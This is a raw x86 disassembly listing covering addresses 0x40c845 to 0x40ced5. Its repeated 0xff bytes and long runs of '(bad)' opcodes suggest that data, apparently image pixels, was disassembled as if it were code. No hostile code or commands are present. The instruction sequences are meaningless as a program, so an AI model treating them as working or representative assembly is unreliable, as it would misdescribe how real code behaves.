  40c845:	jb     0x40c8b3
  40c847:	dec    esp
  40c849:	add    BYTE PTR [eax-0x66660001],0xff
  40c850:	call   FWORD PTR [esi-0x5b000062]
  40c856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c857:	(bad)  
  40c858:	jmp    FWORD PTR [edx-0x4f000056]
  40c85e:	mov    al,0xff
  40c860:	push   DWORD PTR [ebp-0x4500004b]
  40c866:	mov    edx,0xc0c0ffff
  40c86b:	(bad)  
  40c86c:	inc    edi
  40c86e:	(bad)  
  40c86f:	(bad)  
  40c870:	dec    ebx
  40c872:	retf   
  40c873:	(bad)  
  40c874:	call   edx
  40c876:	sar    bh,cl
  40c878:	(bad)  
  40c879:	fcomp  st(0)
  40c87b:	(bad)  
  40c87c:	(bad)  
  40c87d:	fstp   st(5)
  40c87f:	(bad)  
  40c880:	(bad)  
  40c881:	out    dx,al
  40c882:	out    dx,al
  40c883:	(bad)  
  40c884:	(bad)  
  40c885:	(bad)  
  40c886:	(bad)  
  40c887:	(bad)  
  40c888:	(bad)  
  40c889:	(bad)  
  40c88a:	(bad)  
  40c88b:	(bad)  
  40c88c:	(bad)  
  40c88d:	(bad)  
  40c88e:	(bad)  
  40c88f:	(bad)  
  40c890:	in     al,dx
  40c891:	loop   0x40c875
  40c893:	call   FWORD PTR [edi+0x46ff7070]
  40c899:	cs rol DWORD PTR cs:[eax],cl
  40c89d:	add    BYTE PTR [eax],al
  40c89f:	mov    es,WORD PTR [eax]
  40c8a1:	add    BYTE PTR [eax],al
  40c8a3:	inc    ecx
  40c8a4:	add    BYTE PTR [eax],al
  40c8a6:	add    BYTE PTR [eax+eax*1],cl
	...
  40c8b1:	add    BYTE PTR [eax],al
  40c8b3:	add    bh,bh
  40c8b5:	(bad)  
  40c8b6:	inc    DWORD PTR [eax]
  40c8b8:	bound  esp,QWORD PTR [edx+0x62]
  40c8bb:	dec    eax
  40c8bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8bf:	dec    ebp
  40c8c1:	int    0xcd
  40c8c3:	dec    esp
  40c8c5:	int3   
  40c8c6:	int3   
  40c8c7:	push   DWORD PTR [eax-0x44004f50]
  40c8cd:	mov    ebx,0xe2e9ffbb
  40c8d2:	(bad)  
  40c8d4:	push   ecx
  40c8d6:	jecxz  0x40c8d7
  40c8d8:	push   ecx
  40c8da:	jecxz  0x40c8db
  40c8dc:	push   ecx
  40c8de:	jecxz  0x40c8df
  40c8e0:	add    al,0x9d
  40c8e2:	pop    es
  40c8e3:	inc    DWORD PTR [ebx*4-0x62fb00f9]
  40c8ea:	pop    es
  40c8eb:	inc    DWORD PTR [ebx*4-0x51cb00f9]
  40c8f2:	xor    edi,edi
  40c8f4:	pusha  
  40c8f5:	scas   eax,DWORD PTR es:[edi]
  40c8f6:	inc    ebx
  40c8f7:	dec    DWORD PTR [edi-0x4000a94e]
  40c8fd:	mov    ebx,0x90c6ff73
  40c902:	jl     0x40c903
  40c904:	mov    bl,0x76
  40c906:	jbe    0x40c907
  40c908:	jmp    DWORD PTR [ecx-0x6400005f]
  40c90e:	fwait
  40c90f:	(bad)  
  40c910:	call   FWORD PTR [ecx-0x61000067]
  40c916:	sahf   
  40c917:	(bad)  
  40c918:	jmp    DWORD PTR [esp+eiz*4-0x55550001]
  40c91f:	(bad)  
  40c920:	push   DWORD PTR [eax-0x4a000050]
  40c926:	mov    ch,0xff
  40c928:	(bad)  
  40c929:	mov    edx,0xc0ffffba
  40c92e:	sar    bh,0xff
  40c931:	mov    edi,0xcbcbffff
  40c937:	(bad)  
  40c938:	call   edx
  40c93a:	sar    bh,cl
  40c93c:	(bad)  
  40c93d:	fcomp  st(0)
  40c93f:	(bad)  
  40c940:	(bad)  
  40c941:	sti    
  40c942:	sti    
  40c943:	(bad)  
  40c944:	(bad)  
  40c945:	(bad)  
  40c946:	(bad)  
  40c947:	(bad)  
  40c948:	(bad)  
  40c949:	(bad)  
  40c94a:	(bad)  
  40c94b:	(bad)  
  40c94c:	(bad)  
  40c94d:	(bad)  
  40c94e:	(bad)  
  40c94f:	(bad)  
  40c950:	(bad)  
  40c951:	(bad)  
  40c952:	(bad)  
  40c953:	jmp    esi
  40c955:	(bad)  
  40c957:	call   DWORD PTR [edx+0x26fb6161]
  40c95d:	sbb    bl,BYTE PTR [edx]
  40c95f:	rol    BYTE PTR [eax],0x0
  40c962:	add    BYTE PTR [ecx+0x0],bh
  40c965:	add    BYTE PTR [eax],al
  40c967:	daa    
  40c968:	add    BYTE PTR [eax],al
  40c96a:	add    BYTE PTR [eax+eax*1],al
  40c96d:	add    BYTE PTR [eax],al
  40c96f:	add    BYTE PTR [eax],al
  40c971:	add    BYTE PTR [eax],al
  40c973:	add    bh,bh
  40c975:	(bad)  
  40c976:	inc    DWORD PTR [eax]
  40c978:	arpl   WORD PTR [ebx+0x63],sp
  40c97b:	dec    eax
  40c97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c97e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c97f:	inc    edx
  40c981:	ret    0xffc2
  40c984:	cdq    
  40c985:	cdq    
  40c986:	cdq    
  40c987:	push   DWORD PTR [ebp-0x2d004a4b]
  40c98d:	rcl    dl,cl
  40c98f:	(bad)  
  40c990:	jmp    0xdfef:0xffffdae2
  40c997:	(bad)  
  40c998:	(bad)  
  40c999:	out    dx,eax
  40c99a:	(bad)  
  40c99c:	(bad)  
  40c99d:	out    dx,eax
  40c99e:	(bad)  
  40c9a0:	push   gs
  40c9a2:	push   ss
  40c9a3:	dec    DWORD PTR [edi]
  40c9a5:	test   al,0x16
  40c9a7:	dec    DWORD PTR [edi]
  40c9a9:	test   al,0x16
  40c9ab:	dec    DWORD PTR [edi]
  40c9ad:	test   al,0x16
  40c9af:	dec    DWORD PTR ds:0xff13a6
  40c9b5:	cdq    
  40c9b6:	add    bh,bh
  40c9b8:	add    BYTE PTR [ecx-0x6cec0100],bl
  40c9be:	or     eax,0x666699ff
  40c9c3:	push   edx
  40c9c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9c7:	(bad)  
  40c9c8:	jmp    DWORD PTR [edi-0x5e000059]
  40c9ce:	mov    eax,ds:0x9b9bffff
  40c9d3:	(bad)  
  40c9d4:	call   FWORD PTR [ecx-0x61000067]
  40c9da:	sahf   
  40c9db:	(bad)  
  40c9dc:	jmp    DWORD PTR [esp+eiz*4-0x55550001]
  40c9e3:	(bad)  
  40c9e4:	push   DWORD PTR [eax-0x4a000050]
  40c9ea:	mov    ch,0xff
  40c9ec:	(bad)  
  40c9ed:	mov    edx,0xc0ffffba
  40c9f2:	sar    bh,0xff
  40c9f5:	mov    edi,0xcbcbffff
  40c9fb:	(bad)  
  40c9fc:	(bad)  
  40c9fd:	fstp   st(5)
  40c9ff:	(bad)  
  40ca00:	(bad)  
  40ca01:	(bad)  
  40ca02:	(bad)  
  40ca03:	(bad)  
  40ca04:	(bad)  
  40ca05:	(bad)  
  40ca06:	(bad)  
  40ca07:	(bad)  
  40ca08:	(bad)  
  40ca09:	(bad)  
  40ca0a:	(bad)  
  40ca0b:	(bad)  
  40ca0c:	(bad)  
  40ca0d:	(bad)  
  40ca0e:	(bad)  
  40ca0f:	(bad)  
  40ca10:	(bad)  
  40ca11:	(bad)  
  40ca12:	(bad)  
  40ca13:	(bad)  
  40ca14:	(bad)  
  40ca15:	(bad)  
  40ca16:	(bad)  
  40ca17:	dec    esp
  40ca19:	mov    bl,0xb3
  40ca1b:	inc    DWORD PTR [edx+0xf35757]
  40ca21:	add    BYTE PTR [eax],al
  40ca23:	mov    eax,ds:0x53000000
  40ca28:	add    BYTE PTR [eax],al
  40ca2a:	add    BYTE PTR [ecx],dl
	...
  40ca34:	(bad)  
  40ca35:	(bad)  
  40ca36:	inc    DWORD PTR [eax]
  40ca38:	fs fs fs dec eax
  40ca3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3f:	inc    edi
  40ca41:	mov    edi,0xd2d2d2ff
  40ca47:	(bad)  
  40ca48:	(bad)  
  40ca4a:	fcos   
  40ca4c:	fcomp  st(0)
  40ca4e:	fdivr  st,st(7)
  40ca50:	out    0xdf,al
  40ca52:	fdivr  st,st(7)
  40ca54:	(bad)  
  40ca55:	in     al,dx
  40ca56:	(bad)  
  40ca58:	(bad)  
  40ca59:	in     al,dx
  40ca5a:	(bad)  
  40ca5c:	(bad)  
  40ca5d:	in     al,dx
  40ca5e:	(bad)  
  40ca60:	pop    ss
  40ca61:	mov    al,0x23
  40ca63:	call   DWORD PTR [edi]
  40ca65:	mov    al,0x23
  40ca67:	call   DWORD PTR [edi]
  40ca69:	mov    al,0x23
  40ca6b:	call   DWORD PTR [edi]
  40ca6d:	mov    al,0x23
  40ca6f:	call   DWORD PTR [ecx]
  40ca71:	stos   BYTE PTR es:[edi],al
  40ca72:	sbb    bh,bh
  40ca74:	add    BYTE PTR [ecx-0x66ff0100],bl
  40ca7a:	add    bh,bh
  40ca7c:	pusha  
  40ca7d:	jns    0x40cabf
  40ca7f:	(bad)  
  40ca80:	mov    edi,0xffff8585
  40ca85:	mov    bl,0xb3
  40ca87:	(bad)  
  40ca88:	jmp    FWORD PTR [ebp-0x58000053]
  40ca8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca8f:	(bad)  
  40ca90:	jmp    DWORD PTR [ecx-0x6400005f]
  40ca96:	fwait
  40ca97:	(bad)  
  40ca98:	call   FWORD PTR [ecx-0x61000067]
  40ca9e:	sahf   
  40ca9f:	(bad)  
  40caa0:	jmp    DWORD PTR [esp+eiz*4-0x55550001]
  40caa7:	(bad)  
  40caa8:	push   DWORD PTR [eax-0x4a000050]
  40caae:	mov    ch,0xff
  40cab0:	(bad)  
  40cab1:	mov    edx,0xc0ffffba
  40cab6:	sar    bh,0xff
  40cab9:	mov    edi,0xebebffff
  40cabf:	(bad)  
  40cac0:	(bad)  
  40cac1:	(bad)  
  40cac2:	(bad)  
  40cac3:	(bad)  
  40cac4:	(bad)  
  40cac5:	(bad)  
  40cac6:	(bad)  
  40cac7:	(bad)  
  40cac8:	(bad)  
  40cac9:	(bad)  
  40caca:	(bad)  
  40cacb:	(bad)  
  40cacc:	(bad)  
  40cacd:	(bad)  
  40cace:	(bad)  
  40cacf:	(bad)  
  40cad0:	(bad)  
  40cad1:	(bad)  
  40cad2:	(bad)  
  40cad3:	(bad)  
  40cad4:	(bad)  
  40cad5:	(bad)  
  40cad6:	(bad)  
  40cad7:	(bad)  
  40cad8:	(bad)  
  40cad9:	(bad)  
  40cada:	(bad)  
  40cadb:	jmp    DWORD PTR [esi+0x46ff7979]
  40cae1:	das    
  40cae2:	das    
  40cae3:	rol    DWORD PTR [eax],1
  40cae5:	add    BYTE PTR [eax],al
  40cae7:	add    DWORD PTR [eax],0x280000
  40caed:	add    BYTE PTR [eax],al
  40caef:	add    eax,DWORD PTR [eax]
  40caf1:	add    BYTE PTR [eax],al
  40caf3:	add    bh,bh
  40caf5:	(bad)  
  40caf6:	inc    DWORD PTR [eax]
  40caf8:	gs gs gs dec eax
  40cafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cafd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caff:	(bad)  
  40cb00:	(bad)  
  40cb02:	fdiv   st(7),st
  40cb04:	(bad)  
  40cb06:	fdiv   st(7),st
  40cb08:	fcmovnu st,st(3)
  40cb0a:	(bad)  
  40cb0c:	(bad)  
  40cb0e:	fcos   
  40cb10:	loop   0x40caef
  40cb12:	xlat   BYTE PTR ds:[ebx]
  40cb13:	(bad)  
  40cb14:	(bad)  
  40cb15:	jmp    0xffd5:0xeaffffd5
  40cb1c:	(bad)  
  40cb1d:	jmp    0xff30:0xb920ffd5
  40cb24:	and    BYTE PTR [ecx-0x46df00d0],bh
  40cb2a:	xor    bh,bh
  40cb2c:	and    BYTE PTR [ecx-0x56ef00d0],bh
  40cb32:	sbb    bh,bh
  40cb34:	add    BYTE PTR [ecx-0x66ff0100],bl
  40cb3a:	add    bh,bh
  40cb3c:	(bad)
  40cb40:	in     al,dx
  40cb41:	lods   eax,DWORD PTR ds:[esi]
  40cb42:	lods   eax,DWORD PTR ds:[esi]
  40cb43:	(bad)  
  40cb44:	(bad)  
  40cb45:	mov    ecx,0xb3ffffb9
  40cb4a:	mov    bl,0xff
  40cb4c:	jmp    FWORD PTR [ebp-0x58000053]
  40cb52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb53:	(bad)  
  40cb54:	jmp    DWORD PTR [ecx-0x6400005f]
  40cb5a:	fwait
  40cb5b:	(bad)  
  40cb5c:	call   FWORD PTR [ecx-0x61000067]
  40cb62:	sahf   
  40cb63:	(bad)  
  40cb64:	jmp    DWORD PTR [esp+eiz*4-0x55550001]
  40cb6b:	(bad)  
  40cb6c:	push   DWORD PTR [ebx-0x45000047]
  40cb72:	(bad)  
  40cb73:	(bad)  
  40cb74:	(bad)  
  40cb75:	mov    edx,0xc4ffffba
  40cb7a:	(bad)  
  40cb7b:	(bad)  
  40cb7c:	(bad)  
  40cb7d:	(bad)  
  40cb7e:	(bad)  
  40cb7f:	(bad)  
  40cb80:	(bad)  
  40cb81:	(bad)  
  40cb82:	(bad)  
  40cb83:	(bad)  
  40cb84:	(bad)  
  40cb85:	(bad)  
  40cb86:	(bad)  
  40cb87:	(bad)  
  40cb88:	(bad)  
  40cb89:	(bad)  
  40cb8a:	(bad)  
  40cb8b:	(bad)  
  40cb8c:	(bad)  
  40cb8d:	(bad)  
  40cb8e:	(bad)  
  40cb8f:	(bad)  
  40cb90:	(bad)  
  40cb91:	(bad)  
  40cb92:	(bad)  
  40cb93:	(bad)  
  40cb94:	(bad)  
  40cb95:	(bad)  
  40cb96:	(bad)  
  40cb97:	(bad)  
  40cb98:	(bad)  
  40cb99:	(bad)  
  40cb9a:	(bad)  
  40cb9b:	(bad)  
  40cb9c:	fld    st(6)
  40cb9e:	(bad)  
  40cb9f:	dec    DWORD PTR [edx+0xf75c5c]
  40cba5:	add    BYTE PTR [eax],al
  40cba7:	popf   
  40cba8:	add    BYTE PTR [eax],al
  40cbaa:	add    BYTE PTR [esi+0x0],al
  40cbad:	add    BYTE PTR [eax],al
  40cbaf:	or     al,0x0
  40cbb1:	add    BYTE PTR [eax],al
  40cbb3:	add    bh,bh
  40cbb5:	(bad)  
  40cbb6:	inc    DWORD PTR [eax]
  40cbb8:	gs gs gs dec eax
  40cbbc:	test   eax,0xdeffa9a9
  40cbc1:	(bad)  
  40cbc3:	(bad)  
  40cbc4:	(bad)  
  40cbc6:	fdiv   st(7),st
  40cbc8:	(bad)  
  40cbca:	fdiv   st(7),st
  40cbcc:	fcmovnu st,st(3)
  40cbce:	(bad)  
  40cbd0:	jecxz  0x40cbaf
  40cbd2:	xlat   BYTE PTR ds:[ebx]
  40cbd3:	(bad)  
  40cbd4:	(bad)  
  40cbd5:	call   0xe940cbab
  40cbda:	sar    edi,1
  40cbdc:	(bad)  
  40cbdd:	call   0xc169cbb3
  40cbe2:	cmp    eax,0x3dc128ff
  40cbe7:	jmp    FWORD PTR [eax]
  40cbe9:	sar    DWORD PTR ds:0x3dc128ff,0xff
  40cbf0:	adc    al,0xad
  40cbf2:	push   ds
  40cbf3:	inc    DWORD PTR [eax]
  40cbf5:	cdq    
  40cbf6:	add    bh,bh
  40cbf8:	mov    WORD PTR es:[edx],ds
  40cbfb:	jmp    DWORD PTR [esi-0x8c8d]
  40cc01:	(bad)
  40cc04:	(bad)  
  40cc05:	mov    esi,0xb9ffffbe
  40cc0a:	mov    ecx,0xb3b3ffff
  40cc0f:	(bad)  
  40cc10:	jmp    FWORD PTR [ebp-0x58000053]
  40cc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc17:	(bad)  
  40cc18:	jmp    DWORD PTR [ecx-0x6400005f]
  40cc1e:	fwait
  40cc1f:	(bad)  
  40cc20:	call   FWORD PTR [ecx-0x42000067]
  40cc26:	leave  
  40cc27:	(bad)  
  40cc28:	call   ebx
  40cc2a:	hlt    
  40cc2b:	(bad)  
  40cc2c:	dec    esp
  40cc2e:	(bad)  
  40cc2f:	(bad)  
  40cc30:	dec    edi
  40cc32:	(bad)  
  40cc33:	(bad)  
  40cc34:	call   esi
  40cc36:	sti    
  40cc37:	(bad)  
  40cc38:	(bad)  
  40cc39:	fucomip st,st(6)
  40cc3b:	(bad)  
  40cc3c:	(bad)  
  40cc3d:	(bad)  
  40cc3e:	(bad)  
  40cc3f:	(bad)  
  40cc40:	(bad)  
  40cc41:	(bad)  
  40cc42:	(bad)  
  40cc43:	(bad)  
  40cc44:	(bad)  
  40cc45:	(bad)  
  40cc46:	(bad)  
  40cc47:	(bad)  
  40cc48:	(bad)  
  40cc49:	(bad)  
  40cc4a:	(bad)  
  40cc4b:	(bad)  
  40cc4c:	(bad)  
  40cc4d:	(bad)  
  40cc4e:	(bad)  
  40cc4f:	(bad)  
  40cc50:	(bad)  
  40cc51:	(bad)  
  40cc52:	(bad)  
  40cc53:	(bad)  
  40cc54:	(bad)  
  40cc55:	(bad)  
  40cc56:	(bad)  
  40cc57:	(bad)  
  40cc58:	(bad)  
  40cc59:	(bad)  
  40cc5a:	(bad)  
  40cc5b:	(bad)  
  40cc5c:	(bad)  
  40cc5d:	(bad)  
  40cc5e:	(bad)  
  40cc5f:	jmp    DWORD PTR [esi+0x32ff7979]
  40cc65:	and    ah,BYTE PTR [edx]
  40cc67:	ret    0x0
  40cc6a:	add    BYTE PTR [edx+0x0],ch
  40cc6d:	add    BYTE PTR [eax],al
  40cc6f:	sbb    DWORD PTR [eax],eax
  40cc71:	add    BYTE PTR [eax],al
  40cc73:	add    bh,bh
  40cc75:	(bad)  
  40cc76:	inc    DWORD PTR [eax]
  40cc78:	data16 data16 dec ax
  40cc7c:	stos   BYTE PTR es:[edi],al
  40cc7d:	stos   BYTE PTR es:[edi],al
  40cc7e:	stos   BYTE PTR es:[edi],al
  40cc7f:	jmp    eax
  40cc81:	loopne 0x40cc63
  40cc83:	(bad)  
  40cc84:	(bad)  
  40cc86:	fdivp  st(7),st
  40cc88:	(bad)  
  40cc8a:	fdiv   st(7),st
  40cc8c:	(bad)  
  40cc8e:	fdiv   st(7),st
  40cc90:	in     al,0xdd
  40cc92:	xlat   BYTE PTR ds:[ebx]
  40cc93:	(bad)  
  40cc94:	jmp    ebp
  40cc96:	int3   
  40cc97:	(bad)  
  40cc98:	jmp    ebp
  40cc9a:	int3   
  40cc9b:	(bad)  
  40cc9c:	jmp    ebp
  40cc9e:	int3   
  40cc9f:	push   DWORD PTR [ecx]
  40cca1:	retf   0xff49
  40cca4:	xor    edx,ecx
  40cca6:	dec    ecx
  40cca7:	push   DWORD PTR [ecx]
  40cca9:	retf   0xff49
  40ccac:	xor    edx,ecx
  40ccae:	dec    ecx
  40ccaf:	call   FWORD PTR [eax]
  40ccb1:	mov    cl,0x25
  40ccb3:	inc    DWORD PTR [eax]
  40ccb5:	cdq    
  40ccb6:	add    bh,bh
  40ccb8:	dec    ebp
  40ccb9:	xor    BYTE PTR [ebx],0xff
  40ccbc:	mov    edi,0xffff8c8c
  40ccc1:	retf   
  40ccc2:	retf   
  40ccc3:	(bad)  
  40ccc4:	inc    ebp
  40ccc6:	(bad)  
  40ccc9:	mov    esi,0xb9ffffbe
  40ccce:	mov    ecx,0xb3b3ffff
  40ccd3:	(bad)  
  40ccd4:	jmp    FWORD PTR [ebp-0x58000053]
  40ccda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccdb:	(bad)  
  40ccdc:	jmp    DWORD PTR [ecx-0x3300005f]
  40cce2:	sar    edi,cl
  40cce4:	jmp    ebp
  40cce6:	(bad)  
  40cce7:	(bad)  
  40cce8:	(bad)  
  40cce9:	fcos   
  40cceb:	(bad)  
  40ccec:	inc    esp
  40ccee:	in     eax,dx
  40ccef:	(bad)  
  40ccf0:	inc    ebp
  40ccf2:	jmp    0xffff:0xfad6ffff
  40ccf9:	jecxz  0x40ccfa
  40ccfb:	(bad)  
  40ccfc:	push   eax
  40ccfe:	(bad)  
  40ccff:	(bad)  
  40cd00:	(bad)  
  40cd01:	(bad)  
  40cd02:	(bad)  
  40cd03:	(bad)  
  40cd04:	(bad)  
  40cd05:	(bad)  
  40cd06:	(bad)  
  40cd07:	(bad)  
  40cd08:	(bad)  
  40cd09:	(bad)  
  40cd0a:	(bad)  
  40cd0b:	(bad)  
  40cd0c:	(bad)  
  40cd0d:	(bad)  
  40cd0e:	(bad)  
  40cd0f:	(bad)  
  40cd10:	(bad)  
  40cd11:	(bad)  
  40cd12:	(bad)  
  40cd13:	(bad)  
  40cd14:	(bad)  
  40cd15:	(bad)  
  40cd16:	(bad)  
  40cd17:	(bad)  
  40cd18:	(bad)  
  40cd19:	(bad)  
  40cd1a:	(bad)  
  40cd1b:	(bad)  
  40cd1c:	(bad)  
  40cd1d:	(bad)  
  40cd1e:	(bad)  
  40cd1f:	inc    esi
  40cd21:	test   eax,0x476bffa9
  40cd26:	inc    edi
  40cd27:	in     al,0x0
  40cd29:	add    BYTE PTR [eax],al
  40cd2b:	test   DWORD PTR [eax],eax
  40cd2d:	add    BYTE PTR [eax],al
  40cd2f:	and    al,0x0
  40cd31:	add    BYTE PTR [eax],al
  40cd33:	add    bh,bh
  40cd35:	(bad)  
  40cd36:	inc    DWORD PTR [eax]
  40cd38:	addr16 addr16 addr16 dec eax
  40cd3c:	stos   DWORD PTR es:[edi],eax
  40cd3d:	stos   DWORD PTR es:[edi],eax
  40cd3e:	stos   DWORD PTR es:[edi],eax
  40cd3f:	jmp    ecx
  40cd41:	loope  0x40cd24
  40cd43:	jmp    eax
  40cd45:	loopne 0x40cd27
  40cd47:	(bad)  
  40cd48:	(bad)  
  40cd4a:	fdivp  st(7),st
  40cd4c:	(bad)  
  40cd4e:	fdiv   st(7),st
  40cd50:	in     eax,0xde
  40cd52:	xlat   BYTE PTR ds:[ebx]
  40cd53:	(bad)  
  40cd54:	jmp    ebx
  40cd56:	(bad)  
  40cd57:	(bad)  
  40cd58:	jmp    ebx
  40cd5a:	(bad)  
  40cd5b:	(bad)  
  40cd5c:	jmp    ebx
  40cd5e:	(bad)  
  40cd5f:	(bad)  
  40cd60:	cmp    edx,esp
  40cd62:	pop    ecx
  40cd63:	(bad)  
  40cd64:	cmp    edx,esp
  40cd66:	pop    ecx
  40cd67:	(bad)  
  40cd68:	cmp    edx,esp
  40cd6a:	pop    ecx
  40cd6b:	(bad)  
  40cd6c:	cmp    edx,esp
  40cd6e:	pop    ecx
  40cd6f:	call   FWORD PTR [esi]
  40cd71:	mov    bh,0x2d
  40cd73:	inc    DWORD PTR [eax]
  40cd75:	cdq    
  40cd76:	add    bh,bh
  40cd78:	arpl   WORD PTR [esi+0x46],si
  40cd7b:	dec    esp
  40cd7d:	fwait
  40cd7e:	fwait
  40cd7f:	(bad)  
  40cd80:	dec    esp
  40cd82:	int3   
  40cd83:	(bad)  
  40cd84:	dec    ebx
  40cd86:	retf   
  40cd87:	(bad)  
  40cd88:	inc    ebp
  40cd8a:	(bad)  
  40cd8d:	mov    esi,0xb9ffffbe
  40cd92:	mov    ecx,0xb3b3ffff
  40cd97:	(bad)  
  40cd98:	jmp    FWORD PTR [ebp-0x42000053]
  40cd9e:	mov    ebp,0xfff2ffff
  40cda3:	(bad)  
  40cda4:	jmp    eax
  40cda6:	stc    
  40cda7:	(bad)  
  40cda8:	jmp    FWORD PTR [ecx-0x7220004d]
  40cdae:	(bad)  
  40cdaf:	call   edx
  40cdb1:	mov    cl,BYTE PTR [edx-0x43450d01]
  40cdb7:	(bad)  
  40cdb8:	(bad)  
  40cdb9:	in     al,dx
  40cdba:	(bad)  
  40cdbb:	(bad)  
  40cdbc:	(bad)  
  40cdbd:	out    dx,al
  40cdbe:	(bad)  
  40cdbf:	(bad)  
  40cdc0:	(bad)  
  40cdc1:	cli    
  40cdc2:	(bad)  
  40cdc3:	(bad)  
  40cdc4:	(bad)  
  40cdc5:	(bad)  
  40cdc6:	(bad)  
  40cdc7:	(bad)  
  40cdc8:	(bad)  
  40cdc9:	(bad)  
  40cdca:	(bad)  
  40cdcb:	(bad)  
  40cdcc:	cld    
  40cdcd:	cli    
  40cdce:	cli    
  40cdcf:	(bad)  
  40cdd0:	cli    
  40cdd1:	div    edi
  40cdd3:	(bad)  
  40cdd4:	stc    
  40cdd5:	cmc    
  40cdd6:	cmc    
  40cdd7:	(bad)  
  40cdd8:	stc    
  40cdd9:	cmc    
  40cdda:	cmc    
  40cddb:	(bad)  
  40cddc:	stc    
  40cddd:	cmc    
  40cdde:	cmc    
  40cddf:	jmp    ecx
  40cde1:	rcl    ecx,1
  40cde3:	dec    DWORD PTR [edx+0xf75c5c]
  40cde9:	add    BYTE PTR [eax],al
  40cdeb:	xchg   esp,eax
  40cdec:	add    BYTE PTR [eax],al
  40cdee:	add    BYTE PTR [esi],ch
  40cdf0:	add    BYTE PTR [eax],al
  40cdf2:	add    BYTE PTR [eax],al
  40cdf4:	(bad)  
  40cdf5:	(bad)  
  40cdf6:	inc    DWORD PTR [eax]
  40cdf8:	imul   ebp,DWORD PTR [ecx+0x69],0xadadad48
  40cdff:	jmp    edx
  40ce01:	loop   0x40cde5
  40ce03:	jmp    ecx
  40ce05:	loope  0x40cde8
  40ce07:	jmp    eax
  40ce09:	loopne 0x40cdeb
  40ce0b:	(bad)  
  40ce0c:	(bad)  
  40ce0e:	fdivp  st(7),st
  40ce10:	in     eax,0xde
  40ce12:	(bad)  
  40ce13:	(bad)  
  40ce14:	jmp    ecx
  40ce16:	ret    
  40ce17:	(bad)  
  40ce18:	jmp    ecx
  40ce1a:	ret    
  40ce1b:	(bad)  
  40ce1c:	jmp    ecx
  40ce1e:	ret    
  40ce1f:	inc    DWORD PTR [ebp+ebx*8+0x66]
  40ce23:	inc    DWORD PTR [ebp+ebx*8+0x66]
  40ce27:	inc    DWORD PTR [ebp+ebx*8+0x66]
  40ce2b:	inc    DWORD PTR [ebp+ebx*8+0x66]
  40ce2f:	jmp    DWORD PTR [edx]
  40ce31:	mov    ebx,0x9900ff33
  40ce36:	add    bh,bh
  40ce38:	jae    0x40cead
  40ce3a:	dec    ebp
  40ce3b:	jmp    esi
  40ce3d:	mov    ecx,0xd2ffffb9
  40ce42:	sar    bh,cl
  40ce44:	dec    esp
  40ce46:	int3   
  40ce47:	(bad)  
  40ce48:	dec    ebx
  40ce4a:	retf   
  40ce4b:	(bad)  
  40ce4c:	inc    ebp
  40ce4e:	(bad)  
  40ce51:	mov    esi,0xb9ffffbe
  40ce56:	mov    ecx,0xb3b3ffff
  40ce5b:	(bad)  
  40ce5c:	jmp    ecx
  40ce5e:	loope  0x40ce5f
  40ce60:	push   edx
  40ce62:	(bad)  
  40ce63:	(bad)  
  40ce64:	(bad)  
  40ce65:	mov    edx,0x7abfffc4
  40ce6a:	jp     0x40ce6b
  40ce6c:	lahf   
  40ce6d:	jbe    0x40cee4
  40ce6f:	jmp    FWORD PTR [edi-0x6600827b]
  40ce75:	data16 data16 (bad) 
  40ce78:	fld    st(6)
  40ce7a:	(bad)  
  40ce7b:	(bad)  
  40ce7c:	push   ecx
  40ce7e:	(bad)  
  40ce7f:	(bad)  
  40ce80:	(bad)  
  40ce81:	cli    
  40ce82:	(bad)  
  40ce83:	(bad)  
  40ce84:	stc    
  40ce85:	div    ch
  40ce87:	push   esp
  40ce89:	out    dx,al
  40ce8a:	in     al,dx
  40ce8b:	push   esp
  40ce8d:	in     eax,dx
  40ce8e:	jmp    0x40ce8f
  40ce90:	hlt    
  40ce91:	in     eax,dx
  40ce92:	jmp    0x40ce93
  40ce94:	hlt    
  40ce95:	in     eax,dx
  40ce96:	jmp    0x40ce97
  40ce98:	hlt    
  40ce99:	in     eax,dx
  40ce9a:	jmp    0x40ce9b
  40ce9c:	hlt    
  40ce9d:	in     eax,dx
  40ce9e:	jmp    0x40ce9f
  40cea0:	hlt    
  40cea1:	in     eax,dx
  40cea2:	jmp    0x40cea3
  40cea4:	cdq    
  40cea5:	data16 inc WORD PTR [eax]
  40cea9:	add    BYTE PTR [eax],al
  40ceab:	popf   
  40ceac:	add    BYTE PTR [eax],al
  40ceae:	add    BYTE PTR [edi],bh
  40ceb0:	add    BYTE PTR [eax],al
  40ceb2:	add    BYTE PTR [eax],al
  40ceb4:	(bad)  
  40ceb5:	(bad)  
  40ceb6:	inc    DWORD PTR [eax]
  40ceb8:	push   0x6a
  40ceba:	push   0x48
  40cebc:	scas   al,BYTE PTR es:[edi]
  40cebd:	scas   al,BYTE PTR es:[edi]
  40cebe:	scas   al,BYTE PTR es:[edi]
  40cebf:	jmp    esp
  40cec1:	in     al,0xe4
  40cec3:	jmp    edx
  40cec5:	loop   0x40cea9
  40cec7:	jmp    ecx
  40cec9:	loope  0x40ceac
  40cecb:	jmp    eax
  40cecd:	loopne 0x40ceaf
  40cecf:	jmp    esi
  40ced1:	(bad)  
  40ced3:	(bad)  
  40ced4:	(bad)  
  40ced5:	fistp  QWORD PTR [esi-0x41200001]
